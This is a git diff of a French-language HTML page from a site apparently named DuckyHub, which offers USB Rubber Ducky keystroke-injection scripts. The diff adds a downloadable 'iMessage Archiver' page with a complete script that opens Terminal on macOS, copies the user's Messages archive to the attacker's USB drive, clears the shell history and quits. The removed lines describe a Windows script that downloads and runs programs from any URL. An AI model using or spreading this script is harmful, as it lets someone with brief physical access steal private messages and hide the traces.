@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="../favicon-32x32.png" sizes="32x32" />
-  <title>DuckyHub - Script X</title>
+  <title>Script - iMessages</title>
   <!-- Font Awesome -->
   <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
   <!-- Bootstrap core CSS -->
@@ -26,7 +26,7 @@
       <div class="container">
 
         <!-- Brand -->
-        <a class="navbar-brand waves-effect" href="#">
+        <a class="navbar-brand waves-effect" href="../index.html">
           <img src="../img/ducky/logo.png" height="35" alt="DuckyHub Logo">
           <strong class="white-text">DuckyHub</strong>
         </a>
@@ -56,8 +56,8 @@
               <a class="white-text nav-link dropdown-toggle" id="navbarDropdownMenuLink" data-toggle="dropdown"
                 aria-haspopup="true" aria-expanded="false">Apprendre  </a>
               <div class="dropdown-menu ducky-blue" aria-labelledby="navbarDropdownMenuLink">
-                <a class="dropdown-item white-text" href="#">Tutoriels</a>
-                <a class="dropdown-item white-text" href="#">Ressources</a>
+                <a class="dropdown-item white-text" href="../apprendre.html">Tutoriels</a>
+                <a class="dropdown-item white-text" href="../apprendre.html">Ressources</a>
               </div>
             </li>
             <!-- Apprendre -->
@@ -96,31 +96,64 @@
 
   <!--Main layout-->
   <main class="mt-5 pt-5">
-  </br>
     <div class="container">
-      <h1 class="h1 ducky-blue-text">Executer une application depuis internet</h1>
-      </br>
-      <div class="row">
-        <div class="col-sm">
-          <h3 class="h3 ducky-blue-text">Informations </h3>
-          </br>
-          <div>
-            <h4 class="h4 ducky-blue-text">Système(s) d'exploitation </h4>
-            <p class="ducky-blue-text">Windows 7</p>
-          </div>
-          <div>
-          <h4 class="h4 ducky-blue-text">Fonctionnalité </h4>
-            <p class="ducky-blue-text">Avec ce script, tu pourras télécharger puis executer les applications de ton choix depuis Internet! </br>Le script ouvre d'abord une interface de commande, puis génère un vbscript qui pourra, dans la machine, télécharger puis executer un document depuis une n'importe quelle adresse URL.</p>
-          </div>
-          <div>
-            <h4 class="h4 ducky-blue-text">Déroulement du script</h4>
-            <p class="ducky-blue-text">Etape 1</p>
-            <p class="ducky-blue-text">Etape 2</p>
-            <p class="ducky-blue-text">Etape 3</p>
-          </div>
+      
+      <h3 class="ducky-blue-text pb-4">iMessage Archiver</h3>
+
+      <div>
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Système(s) d'exploitation :</h4>
+          <p class="ducky-blue-text"><i class="fab fa-apple"></i> MacOS</p>
         </div>
-        <div class="col-sm">
-          <button type="button" class="btn btn-primary ducky-blue rounded">Télécharger</button>
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Fonctionnalités :</h4>
+          <p class="ducky-blue-text">Extrait des messages vers un fichier au choix.</p>
+        </div>
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Déroulement du script :</h4>
+
+          <ol>
+            <li class="ducky-blue-text">Ouverture du terminal</li>
+            <li class="ducky-blue-text">Copie de l'archive vers un périphérique USB</li>
+            <li class="ducky-blue-text">Effacement de l'historique de commandes</li>
+          </ol>
+        </div>
+
+        <div class="text-center py-4">
+          <a href="../resources/scripts/dh-imessage-archiver.txt" download>
+            <button type="button" class="btn btn-primary ducky-blue rounded">Télécharger</button>
+          </a>
+        </div>
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Le script :</h4>
+
+          <pre class="line-numbers mdb-color darken-3"><code>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 3000</span>
+            <span class="new-line blue-text">GUI SPACE</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 150</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Terminal</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 300</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> history -c</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> diskutil umount /Volumes/RubberDucky</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 500</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> history -c</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> echo 5A13X99</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 1000</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> exit</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 250</span>
+            <span class="new-line blue-text">GUI Q</span>
+          </code></pre>
         </div>
       </div>
     </div>
@@ -131,10 +164,10 @@
   <footer class="page-footer text-center font-small ducky-blue mt-4 wow fadeIn">
 
     <!-- Links -->
-    <div class="py-3">
-      <a class="px-2" href="">Lien 1</a>
-      <a class="px-2" href="">Lien 2</a>
-      <a class="px-2" href="">Lien 3</a>
+    <div class="py-2 row justify-content-center">
+      <a class="py-1 px-2 col-sm-2" href="https://github.com/cvbenur/duckyhub-website/"><i class="fab fa-github white-text"></i> DuckyHub sur GitHub</a>
+      <a class="py-1 px-2 col-sm-2" href="../team.html"><i class="fas fa-users white-text"></i> L'équipe</a>
+      <a class="py-1 px-2 col-sm-2" href="https://github.com/cvbenur/duckyhub-website/issues"><i class="fas fa-exclamation-circle white-text"></i> Signaler un bug</a>
     </div>
     <!-- Links -->
 
@@ -165,4 +198,3 @@
 </body>
 
 </html>
-
